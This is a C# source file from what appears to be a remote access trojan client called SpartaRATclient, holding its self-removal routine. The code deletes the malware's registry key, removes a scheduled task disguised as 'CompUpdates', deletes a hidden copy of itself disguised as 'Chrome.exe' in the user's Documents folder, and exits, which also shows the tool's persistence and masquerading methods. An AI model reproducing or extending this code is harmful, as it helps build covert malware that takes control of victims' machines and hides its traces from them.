using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace SpartaRATclient.Tools
{
    public class DeleteApp
    {
        public void Delete()
        {
            //1. removing registry ClientValues key
            //2. removing task scheduler schtask called CompUpdates
            //3. removing app from documents folder
            //4. exit program

            RegistryData data = new RegistryData();
            data.DeleteSubKeyTree(@"Software\ClientValues");

            Powershell PowershellCommand = new Powershell();
            PowershellCommand.Run(@"/C schtasks /delete /tn ""CompUpdates"" /f");

            FileCopy ThisProgram = new FileCopy();
            if (ThisProgram.This() == "exist") //if this program exist at the new hidden path then
                File.Delete(@"C:\Users\" + Environment.UserName + @"\Documents\Chrome.exe");

            Environment.Exit(0);
        }
    }
}
